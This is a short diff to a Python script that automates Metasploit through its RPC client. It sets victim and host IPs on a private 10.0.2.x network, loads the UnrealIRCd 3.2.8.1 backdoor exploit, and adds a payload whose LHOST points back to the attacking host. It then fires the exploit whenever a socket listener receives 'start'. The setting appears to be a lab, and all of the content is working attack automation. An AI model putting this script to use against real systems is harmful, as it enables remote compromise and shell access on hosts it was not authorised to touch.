@@ -3,7 +3,8 @@ import socket
 import time
 
 client = MsfRpcClient('123456')
-victim_ip = '10.0.2.11'
+victim_ip = '10.0.2.5'
+host_ip = '10.0.2.4'
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server_address = ('', 8000)
 
@@ -48,18 +49,16 @@ def exploit(explt, payload):
 
 
 if __name__ == '__main__':
-	i = 0
 	explt = get_exploit('unix/irc/unreal_ircd_3281_backdoor')
+	payload = client.modules.use('payload', explt.payloads[5])
+	payload['LHOST'] = host_ip
 	sock.bind(server_address)
 	sock.listen(5)
 	client_sock, addr = sock.accept()
 	client_sock.sendall('ready')
-	print explt.payloads
 	while True:
 		cmd = client_sock.recv(100)
 		if cmd == 'start':
-			payload = explt.payloads[5]
-			# i = (i + 1) % 4;
 			is_succeeded = exploit(explt, payload)
 			print(("success" if is_succeeded else "failure") + " , payload = " + payload)
 			stop_all_jobs()
@@ -70,4 +69,3 @@ if __name__ == '__main__':
 			break
 	client_sock.close()
 	sock.close()
-
